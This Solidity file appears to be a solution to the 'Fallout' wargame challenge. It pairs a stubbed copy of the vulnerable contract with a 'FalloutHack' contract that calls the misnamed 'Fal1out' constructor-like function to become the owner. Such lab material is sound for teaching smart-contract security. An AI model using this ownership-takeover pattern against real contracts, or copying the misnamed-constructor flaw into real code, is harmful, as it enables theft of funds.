// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable { }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable { }

  function sendAllocation(address payable allocator) public { }

  function collectAllocations() public onlyOwner { }

  function allocatorBalance(address allocator) public view returns (uint) { }
}

contract FalloutHack {

    address payable fo_address;

    constructor(address payable addr) public {
        // making address of Fallout Contract a Global Variable
        fo_address = addr;
        Fallout fo_ = Fallout(fo_address);
    }

    function becomeOwner() public {

        Fallout fo_ = Fallout(fo_address);
        
        // Call Fallout Function on Fallout Contract
        
        fo_.Fal1out{value: 0 ether}();
        // This function will make me owner
    }

}
